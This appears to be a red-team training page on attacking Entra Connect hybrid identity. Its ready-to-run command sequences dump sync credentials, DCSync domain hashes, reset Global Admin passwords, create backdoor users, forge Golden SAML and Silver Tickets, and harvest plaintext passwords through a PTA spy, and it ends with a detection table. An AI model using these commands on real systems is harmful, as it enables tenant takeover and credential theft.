---
layout: training-page
title: "Entra Connect / AAD Connect Compromise — Red Team Academy"
module: "Active Directory"
tags:
  - entra-connect
  - aad-connect
  - hybrid-identity
  - phs
  - pta
  - adfs
  - golden-saml
  - msol
page_key: "ad-entra-connect-compromise"
render_with_liquid: false
---

# Entra Connect / AAD Connect Compromise

The Entra Connect server (formerly Azure AD Connect, formerly DirSync) is the hinge between on-prem Active Directory and Microsoft Entra ID. Whoever owns this server moves bidirectionally — on-prem to cloud, cloud to on-prem — and can impersonate any user in either direction. It is the single most valuable Windows server in most hybrid environments and consistently the least protected: dropped on a member server, often a stale 2016 box, joined to the domain, treated as "just sync infrastructure," and excluded from Tier 0 hardening because no one ever wrote it into the design document.

On a real engagement, finding the Entra Connect server is usually the shortest path from a domain user shell to Global Administrator. The server holds two pieces of state that should never live on the same box — the on-prem MSOL service account credential (DCSync on the domain) and the cloud Sync_ service account credential (password hash write on every cloud user, including Global Admins). Recover both and the entire hybrid identity perimeter is yours.

This page walks the full kill chain: identify the EC server, decrypt its credential vault, abuse the MSOL account on-prem, abuse the Sync_ account in the cloud, then cover the federation and PTA variants (ADFS token signing, PTA agent injection) and the Seamless SSO key forgery. Tooling throughout is AADInternals (Nestori Syynimaa), ROADtools (Dirk-jan Mollema), and adfsdump (Mandiant).

## Hybrid Identity Models — Pick Your Pivot

Three sync models exist, and the attack changes based on which one is deployed. Before touching the EC server, fingerprint the environment so you know what's actually worth stealing.

| Model | What Entra Connect Holds | Server Compromise Buys You | Federation Server Compromise Buys You |
|-------|--------------------------|----------------------------|----------------------------------------|
| **PHS (Password Hash Sync)** | MSOL_ AD credential, Sync_ cloud credential, NT hashes in flight | DCSync any on-prem user + password-write any cloud user (incl. Global Admins) | N/A — no federation server |
| **PTA (Pass-Through Authentication)** | MSOL_ AD credential, Sync_ cloud credential, PTA agent process | Same as PHS + plaintext password harvesting via PTA agent injection | N/A — agent lives on EC server or auxiliary box |
| **Federation (ADFS / 3rd-party IdP)** | MSOL_ AD credential, Sync_ cloud credential | Same as PHS on the directory side, but auth lives elsewhere | Token-signing certificate → Golden SAML → forge token for any user, any app |

Most enterprises run PHS today. PTA is the second-most-common. Federation is shrinking but still everywhere in finance, healthcare, and government — and Solorigate proved exactly why a federation server compromise is catastrophic.

Determine the model from a low-priv shell:

```
# AADInternals — works with any valid tenant token or anonymous lookup
Get-AADIntLoginInformation -UserName "user@contoso.com"
# Returns: NameSpaceType (Managed = PHS/PTA, Federated = ADFS/3rd party)

# Get-AADIntTenantDetails reveals sync method post-auth
Get-AADIntTenantDetails

# Anonymously identify federation provider
Get-AADIntOpenIDConfiguration -Domain contoso.com
```

## Enumeration — Finding the Entra Connect Server

The EC server is rarely labeled. It looks like a standard member server. Hunt it from on-prem AD using artifacts the installer always leaves behind.

The single most reliable indicator: a domain user named `MSOL_xxxxxxxxxxxx` (12 random hex characters). The installer creates this account in the same OU as the EC server's computer object, with description "Account created by Microsoft Azure Active Directory Connect with installation identifier ... running on computer named <EC_SERVER_HOSTNAME>." The description literally tells you the hostname.

```
# Find MSOL accounts and pull their description (which names the EC server)
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties Description, whenCreated |
  Select-Object Name, Description, whenCreated

# Same query via PowerView (no RSAT needed)
Get-DomainUser -Identity "MSOL_*" -Properties samaccountname,description

# Identify by Service Principal Name on the computer object
Get-ADComputer -Filter * -Properties servicePrincipalName |
  Where-Object { $_.servicePrincipalName -match "ADSync" }

# AADInternals — pull tenant-wide sync state and named server
Get-AADIntCompanyInformation -Credentials $cred |
  Select-Object DirectorySynchronizationEnabled, DirSyncClientMachine, DirSyncClientVersion, DirSyncServiceAccount
# DirSyncClientMachine field is the actual hostname of the EC server

# For federation environments, find the ADFS server(s)
Get-AADIntADFSConfiguration -Server contoso.com

# DNS-side: the federation endpoint
nslookup sts.contoso.com
nslookup adfs.contoso.com
nslookup autologon.microsoftazuread-sso.com

# Certificate side: pull the tenant federation cert from the public OpenID metadata
curl https://login.microsoftonline.com/contoso.com/FederationMetadata/2007-06/FederationMetadata.xml
```

When BloodHound is loaded, the EC server stands out: it usually has an inbound `ReadGMSAPassword` edge from MSOL_ accounts and an outbound replication edge that no normal member server has. Cypher query:

```
MATCH (u:User) WHERE u.samaccountname STARTS WITH 'MSOL_'
MATCH p = (u)-[:HasSession|MemberOf*1..]-(c:Computer)
RETURN p
```

## The MSOL Service Account — DCSync on Every DC

The installer creates `MSOL_xxxxxxxxxxxx` on the on-prem domain and grants it `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the domain root. Together, those are DCSync rights. The credential is stored on the EC server, encrypted at rest, used by the ADSync service to read AD changes.

This is the architectural sin at the center of the entire attack surface: a member server holds a credential that grants Domain Admin-equivalent read access to AD. Compromise the EC server (local admin only — not even SYSTEM is strictly required on older versions) and DCSync becomes a one-liner.

The DCSync grant survives password rotations. If MSOL_ rotates, the new credential is also stored on the EC server. The rights on the domain object are never revoked unless someone manually edits the DACL.

```
# Confirm DS-Replication rights on MSOL account
Get-ObjectAcl -DistinguishedName "DC=contoso,DC=local" -ResolveGUIDs |
  Where-Object { $_.IdentityReference -like "*MSOL_*" } |
  Select-Object IdentityReference, ObjectAceType, ActiveDirectoryRights
# Expect: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, DS-Replication-Get-Changes-In-Filtered-Set
```

The credential itself lives in the ADSync LocalDB on the EC server. Encrypted with a DPAPI key tied to the ADSync service account (or LocalSystem on default installs). Recovering it is mechanical.

## Recovering Sync Credentials from the Entra Connect Server

Once you have local admin on the EC server, the entire credential vault is accessible. The ADSync database runs in a LocalDB instance — the service name varies by version:

| ADSync version | LocalDB service name |
|----------------|----------------------|
| 1.x | `MSSQL$ADSync` |
| 2.0 (2022+) | `MSSQL$ADSync2019` |
| 2.4+ (2024+) | `MSSQL$ADSync2022` |

Enumerate which one is present:

```
Get-Service | Where-Object { $_.Name -like "*ADSync*" }
sc.exe query type= service state= all | findstr ADSync

# Database files (default path)
dir "C:\Program Files\Microsoft Azure AD Sync\Data\"
# ADSync.mdf, ADSync_log.ldf
```

The encrypted credentials live in the `mms_management_agent` table — specifically the `private_configuration_xml` column, encrypted with a key derived from a LocalSystem-protected DPAPI blob. The decryption flow is non-trivial: it requires reading the keyset from the registry, decrypting it with the ADSync service DPAPI master key, and then using the resulting key to decrypt the SQL column.

AADInternals automates all of this. Run on the EC server as local admin:

```
# Install AADInternals
Install-Module AADInternals -Force
Import-Module AADInternals

# Single command — pulls MSOL_ plaintext + Sync_ cloud account plaintext
Get-AADIntSyncCredentials

# Output (real example, redacted):
# Name                              : Active Directory Domain Services
# UserName                          : CONTOSO\MSOL_e2c7f8b1a4d6
# Password                          : Z9!q@7$Lk#wE2pR0vMnT4xC8yU3iAh
# 
# Name                              : Windows Azure Active Directory (Microsoft Online)
# UserName                          : Sync_EC01_e2c7f8b1a4d6@contoso.onmicrosoft.com
# Password                          : 8WqL$nP3@K7vT0xR5mE9!cZ4fU6yA1
```

The first credential is your DCSync key. The second is your cloud privilege escalation key. Both rotate periodically (default 30 days for MSOL_, never for Sync_ unless explicitly rotated), so harvest immediately and use within the window.

If AADInternals is blocked or AMSI flags it, the manual path is documented by Adam Chester (xpn) in "Azure AD Connect for Red Teamers" — uses a small C# loader that imports the ADSync configuration assemblies and calls `mcrypt.Decrypt()` directly. `adconnectdump` (Dirk-jan Mollema) is a Python alternative that operates against the ADSync database file copied off-host.

```
# adconnectdump — works offline against copied database + registry hive
git clone https://github.com/fox-it/adconnectdump
python adconnectdump.py -mdf ADSync.mdf -ldf ADSync_log.ldf -keys system.hive
```

## Cloud Side — Abusing the Sync_ Account

The Sync_ account (`Sync_<EC_HOSTNAME>_<random>@<tenant>.onmicrosoft.com`) is a service account in Entra ID. It holds the `Directory Synchronization Accounts` role — sounds limited, isn't. The role has these effective Graph permissions:

- `Directory.ReadWrite.All` — read/modify any directory object
- Password hash write on every synced and cloud-only user
- Bypass of MFA for the sync account itself (Conditional Access cannot enforce MFA on this role)
- Persistence: cannot be removed from the role through the portal

The catastrophic capability: the Sync_ account can **set passwords on cloud-only Global Administrators**. This is the chain Dirk-jan Mollema demonstrated at TR19 (2019) and that Microsoft has never fundamentally fixed — Sync_ is too critical to sync operations to neuter.

```
# Authenticate as the Sync_ account using the plaintext from Get-AADIntSyncCredentials
$cred = Get-Credential
# username: Sync_EC01_e2c7f8b1a4d6@contoso.onmicrosoft.com
# password: <recovered>

# Acquire token for Azure AD Graph (legacy — still works for sync ops)
$token = Get-AADIntAccessTokenForAADGraph -Credentials $cred

# Find a Global Admin to take over
Get-AADIntGlobalAdmins -AccessToken $token

# Reset password on a cloud-only Global Admin
# This works because Sync_ has password write on ALL users, not just synced ones
Set-AADIntUserPassword -AccessToken $token -SourceAnchor "<base64 immutableId>" -Password "Attacker_Pwn3d!" -Verbose

# For cloud-only users, you need their CloudAnchor (ObjectId) — use this variant
Set-AADIntUserPassword -AccessToken $token -CloudAnchor "User_<objectId>" -Password "Attacker_Pwn3d!" -Verbose

# Now log in as the Global Admin
Connect-AzureAD -Credential (New-Object PSCredential("ga@contoso.com", (ConvertTo-SecureString "Attacker_Pwn3d!" -AsPlainText -Force)))
```

The detection signal is loud once you know what to look for: a `Set user password` audit event sourced from the Sync_ account targeting an unsynced principal. In practice, almost no one alerts on this because the Sync_ account legitimately changes synced user passwords thousands of times per day during PHS sync cycles. The unsynced principal target is the discriminator.

A stealthier variant: instead of resetting a known GA's password, mint a new cloud-only user and elevate it via the Sync_ token's directory write rights. The new user blends into sync noise, and you control credential rotation.

```
# Create a backdoor user with the Sync_ token
$body = @{
  "accountEnabled" = $true
  "displayName" = "Azure Health Monitor"
  "mailNickname" = "azhealthmon"
  "userPrincipalName" = "azhealthmon@contoso.onmicrosoft.com"
  "passwordProfile" = @{ "forceChangePasswordNextSignIn" = $false; "password" = "S3cur3_P@ssw0rd!" }
} | ConvertTo-Json

Invoke-RestMethod -Method POST -Uri "https://graph.microsoft.com/v1.0/users" -Headers @{Authorization = "Bearer $token"} -Body $body -ContentType "application/json"

# Promote to Global Admin via roleAssignment
# Requires escalation through a second Sync_-authorized API call or chained Graph permission
```

## PHS Hash Extraction — Catching NT Hashes in Flight

In PHS environments, the EC server is the only machine in the entire infrastructure that handles plaintext-derived NT hashes during sync. The MSOL account pulls hashes from the DC via MS-DRSR replication, the ADSync service rehashes them (SHA256 of the UTF-16 NT hash, 1000 rounds PBKDF2), and uploads to Entra ID.

Between "DCSync from DC" and "PBKDF2 rehash" the NT hash sits in the ADSync.exe process memory. Inject and you grab every user's NT hash on every sync cycle (default: every 2 minutes for delta sync, every 7 days for full sync).

```
# AADInternals — install a hash extractor that hooks ADSync.exe
Install-AADIntPTASpy
# Despite the name, this also functions in PHS mode to capture in-flight hashes

# Read captured hashes (also captures plaintext if any flow through)
Get-AADIntPTASpyLog -DecodePasswords

# Output: NT hash for every user synced since installation
```

In most engagements you don't need the in-flight technique — you already have DCSync via MSOL_. Use it when:

- You need hashes for accounts excluded from PHS (filtered OUs) — won't work for these, they're never synced
- You need fresh hashes after a password rotation but DCSync is being monitored
- The DC has anti-replication monitoring and you need a quieter alternative

For most ops, run `secretsdump.py` with the MSOL credential and call it done:

```
# DCSync via the recovered MSOL_ creds — cleaner, faster, lower forensic signal than process injection
impacket-secretsdump -dc-ip 10.0.0.10 'contoso.local/MSOL_e2c7f8b1a4d6:Z9!q@7$Lk#wE2pR0vMnT4xC8yU3iAh@DC01.contoso.local' -just-dc

# All hashes including krbtgt — then mint a Golden Ticket
impacket-secretsdump 'contoso.local/MSOL_e2c7f8b1a4d6:Z9!q@7$Lk#wE2pR0vMnT4xC8yU3iAh@DC01.contoso.local' -just-dc-user 'contoso\krbtgt'
```

## ADFS / Federation Server Attacks — Golden SAML

For federated environments, the ADFS server is the real prize, not the EC server. ADFS holds the token-signing private key. Whoever has that key forges SAML responses for any user, asserting any claim, against any service provider — bypassing every authentication factor including FIDO2 and certificate-based MFA. This is Golden SAML, the technique APT29 used in Solorigate to pivot from compromised SolarWinds Orion installs into Microsoft 365 tenants.

### Enumerate ADFS Configuration

```
# From any domain-joined host with the AADInternals module
Get-AADIntADFSConfiguration -Server adfs01.contoso.local

# Locate the ADFS server from event logs on member servers (event 1202 is generated by ADFS proxies)
Get-WinEvent -FilterHashtable @{LogName='AD FS Tracing/Debug'; ID=1202} -MaxEvents 5

# From the ADFS server itself
Get-AdfsProperties
Get-AdfsCertificate -CertificateType Token-Signing
```

### Extract the Token-Signing Certificate

Two paths: extract from the ADFS configuration database (works remotely with appropriate rights), or dump from the local certificate store on the ADFS server (requires local admin on the ADFS host).

```
# === Path 1: AADInternals from the ADFS server (local admin) ===
Import-Module AADInternals
Export-AADIntADFSCertificates
# Drops three .pfx files in current directory:
# ADFS_signing.pfx, ADFS_encryption.pfx, ADFS_ssl.pfx
# Passwords are stored as "password" by default — AADInternals prints the actual one

# === Path 2: ADFSDump (Doug Bienstock / Mandiant) — runs against the WID/SQL config DB ===
# https://github.com/mandiant/ADFSDump
# Compile in Visual Studio, then on ADFS server:
ADFSDump.exe
# Outputs: token-signing cert (DKM-decrypted), service account cert, configuration

# === Path 3: Remote — extract DKM key from AD then decrypt remotely ===
# The ADFS DKM (Distributed Key Manager) key lives in AD under:
# CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=local
# Read it with any domain user — there is no special ACL by default
Export-AADIntADFSConfigurationData -Hash <BCD hash from registry>
```

### Forge a Golden SAML Token

With the token-signing certificate (`.pfx`), forge a SAML response for any user.

```
# AADInternals — forge a SAML token impersonating the target
Open-AADIntOffice365Portal -SAMLToken (
  New-AADIntSAMLToken `
    -ImmutableID "<base64-immutableID-of-target-user>" `
    -Issuer "http://adfs.contoso.com/adfs/services/trust/" `
    -PfxFileName ".\ADFS_signing.pfx" `
    -PfxPassword "password"
)
# Browser opens already authenticated as the target user — no MFA, no password, no signal at Entra ID

# Build a token for the Microsoft Graph endpoint (for API-level operations)
$saml = New-AADIntSAMLToken `
  -UserName "globaladmin@contoso.com" `
  -Issuer "http://adfs.contoso.com/adfs/services/trust/" `
  -PfxFileName ".\ADFS_signing.pfx"

# Exchange the SAML for an OAuth access token
$token = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -Tenant "contoso.onmicrosoft.com"
```

The key property of Golden SAML: **Entra ID has no way to validate the SAML response except by checking the signature**. Since you have the signing key, every forged token is cryptographically indistinguishable from a real one. The token can claim any UPN, any group membership, any MFA assertion. Detection requires correlating Entra sign-ins with ADFS logs — and if you've compromised ADFS, you can suppress those logs at the source.

This is exactly what APT29/NOBELIUM did in Solorigate (December 2020): pivoted from on-prem SolarWinds compromise → ADFS server → token-signing cert → Golden SAML → silent persistence in dozens of M365 tenants for months.

## PTA Agent Abuse — Plaintext Credential Harvesting

For PTA environments, the EC server (or a separate PTA agent host) runs the `Microsoft Azure AD Connect Authentication Agent` service. Every cloud login funnels through it: Entra ID forwards the encrypted credentials to the agent, the agent validates against on-prem AD, returns yes/no. The agent process has the plaintext credentials in memory during every auth.

Inject into that process and harvest plaintext passwords for every user that logs into the cloud.

```
# Identify the PTA agent (usually on EC server in default installs)
Get-Service | Where-Object { $_.Name -eq "AzureADConnectAuthenticationAgent" }

# Install the PTA spy (AADInternals)
Install-AADIntPTASpy
# Hooks the agent process, captures credentials as they flow through

# Wait for users to authenticate (or trigger logins via password spray / phishing)
# Then dump captured plaintext
Get-AADIntPTASpyLog -DecodePasswords

# Sample output:
# Time                    UserName                Password
# 2026-05-23 14:22:18Z    user1@contoso.com       Winter2026!
# 2026-05-23 14:22:31Z    ga@contoso.com          GA_P@ssw0rd_2026
# 2026-05-23 14:23:44Z    helpdesk@contoso.com    HelpdeskRocks!

# Remove the spy (cleanup)
Remove-AADIntPTASpy
```

A more aggressive variant: the PTA agent can be made to return "yes" for any credential, allowing universal auth bypass. This is loud and short-lived — pick it for a one-shot smash-and-grab, not persistence.

```
# Make every PTA validation succeed regardless of password
Set-AADIntPTACertificate -PfxFileName .\stolen_pta.pfx
# Now any password works for any synced user, including ga@contoso.com
```

PTA agent persistence: register your own PTA agent. Microsoft lets you install multiple agents for redundancy. An attacker-controlled agent that you spin up in your own infrastructure (or a co-opted server in the victim environment) participates in the authentication pool and observes every auth that gets routed to it.

```
# Register a rogue PTA agent (requires Sync_ token or Global Admin)
# Microsoft documents this as a legitimate feature ("add agent for HA")
# Attacker spins up the agent on attacker-owned VM joined to victim AD
```

## Seamless SSO Key Forgery — Silver Tickets for the Cloud

Seamless SSO (a feature of Entra Connect, enabled by default with PHS and PTA) creates a computer account in on-prem AD named `AZUREADSSOACC$`. This account holds a Kerberos service key that signs tickets for the cloud SSO endpoint `autologon.microsoftazuread-sso.com`. Anyone with the NT hash of `AZUREADSSOACC$` can forge a Silver Ticket for that SPN — impersonating any user against Entra ID.

The trick: `AZUREADSSOACC$`'s password is set at Seamless SSO installation and **never rotates** unless someone runs `Update-ADSyncKerberosDecryptKey` manually. Most environments have never rotated it. So a 2017 DCSync gives you a working forgery key in 2026.

```
# === Step 1: Get the NT hash of AZUREADSSOACC$ via DCSync ===
impacket-secretsdump -dc-ip 10.0.0.10 'contoso.local/Administrator:password@DC01' -just-dc-user 'AZUREADSSOACC$'
# Output: AZUREADSSOACC$:1234:aad3b4...:<NT_HASH>:::

# === Step 2: Forge a Silver Ticket for the SSO SPN ===
# Mimikatz path
mimikatz # kerberos::golden /user:globaladmin /sid:S-1-5-21-... /target:autologon.microsoftazuread-sso.com /service:HTTP /rc4:<NT_HASH> /ptt

# === Step 3: Hit the autologon endpoint to convert Kerberos to SAML to OAuth ===
# AADInternals — full chain wrapped
$token = New-AADIntUserImpersonationToken -UserName "globaladmin@contoso.com" -SID "S-1-5-21-..." -Hash "<NT_HASH>"
# $token is now an Entra ID access token for the impersonated user

# Use it against Graph
$headers = @{ Authorization = "Bearer $token" }
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
```

Forgery against Seamless SSO is undetectable from the cloud side — Entra ID sees a valid Kerberos-signed authentication from the correct SPN. The only detection is on-prem: a Silver Ticket has no corresponding TGS request to a real DC, and event 4769 will be missing. Hunt for sign-ins from `autologon.microsoftazuread-sso.com` that lack a corresponding on-prem 4769.

## Detection Surface — What Blue Sees

The full attack chain generates real signals at multiple points. A mature blue team will see at least one of these:

| Signal | Source | Notes |
|--------|--------|-------|
| `4624` logon to EC server from non-Tier-0 source | Windows Security log | EC server should only be touched by named admins from a PAW |
| `4662` access to ADFS configuration store | Windows Security log | Hunt for `Microsoft.IdentityServer.Service` reads outside ADFS service account |
| `Set user password` on cloud-only user, actor = Sync_ | Entra ID Audit Logs | This is the Mollema chain signal — should never legitimately happen |
| Sync account sign-in from non-EC IP | Entra ID Sign-in Logs | The Sync_ account should only ever sign in from the EC server's public IP |
| New PTA agent registered | Entra ID Audit Logs | Operation `Register connector` outside change windows |
| New ADFS token-signing certificate added | ADFS Admin log | Event 307 / 575 — investigate every occurrence |
| Anomalous AADConnect health alert | Entra Connect Health | Alerts fire on credential rotation, agent restart, sync failure |
| Mass password changes on synced users | Entra ID Audit Logs | PHS legitimately writes hashes; volume baseline matters |
| Kerberos sign-in to `autologon.microsoftazuread-sso.com` without paired 4769 | Entra ID + on-prem AD logs | Silver Ticket against AZUREADSSOACC$ indicator |
| `MSSQL$ADSync*` queries from non-ADSync.exe | ETW SQL provider | Custom rule — AADInternals leaves this trail |

The single highest-value alert to build: **Sync_ account performs a write operation against an unsynced principal**. That signature catches the Mollema cloud chain and has near-zero false positives.

## Tools

| Tool | Author | Purpose |
|------|--------|---------|
| **AADInternals** | Nestori Syynimaa (@DrAzureAD) | Primary toolkit — credential dumping, Golden SAML, PTA Spy, hash extraction |
| **ROADtools / ROADrecon** | Dirk-jan Mollema (@_dirkjan) | Tenant enumeration, token manipulation, BloodHound-style graphing |
| **adfsdump** | Doug Bienstock / Mandiant | Offline extraction of ADFS DKM and token-signing key |
| **adconnectdump** | Fox-IT / Dirk-jan Mollema | Offline decrypt of Azure AD Connect credentials from copied DB |
| **AzureHound** | SpecterOps | BloodHound collector for Entra ID — maps Sync_ paths |
| **TokenTacticsV2** | Bastian Kanbach (f-bader) | Refresh token abuse, family-of-client-IDs hopping |
| **MicroBurst** | NetSPI / Karl Fosaaen | Azure-wide assessment including Entra Connect indicators |
| **PowerView** | HarmJ0y / Will Schroeder | On-prem AD enumeration to locate MSOL accounts |
| **mimikatz** | Benjamin Delpy | DCSync, Silver Ticket forgery, LSA secrets dump |
| **impacket-secretsdump** | Fortra / SecureAuth | Remote DCSync with MSOL_ credentials |

## Resources

- AADInternals documentation — `https://aadinternals.com/aadinternals/`
- AADInternals GitHub — `github.com/Gerenios/AADInternals`
- Dirk-jan Mollema — "I'm in your cloud" (TR19 / Black Hat USA 2019) — the foundational paper on Sync_ account abuse
- Dirk-jan Mollema blog — `dirkjanm.io` — multiple deep posts on Azure AD Connect internals
- Adam Chester (xpn) — "Azure AD Connect for Red Teamers" — manual credential decryption path
- Mandiant report on Golden SAML in Solorigate — `cloud.google.com/blog/topics/threat-intelligence/unc2452-merged-with-apt29`
- Doug Bienstock — "Detecting Golden SAML" — Mandiant Defender Summit talk
- Microsoft Security Response Center — Entra Connect hardening guidance — `learn.microsoft.com/entra/identity/hybrid/connect/how-to-connect-install-roadmap`
- Microsoft — Securing privileged access for hybrid and cloud deployments in Microsoft Entra ID
- ROADtools GitHub — `github.com/dirkjanm/ROADtools`
- adfsdump GitHub — `github.com/mandiant/ADFSDump`
- adconnectdump GitHub — `github.com/fox-it/adconnectdump`
- AzureHound — `github.com/BloodHoundAD/AzureHound`
- CISA Alert AA21-008A — "Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments" — the Solorigate detection guidance
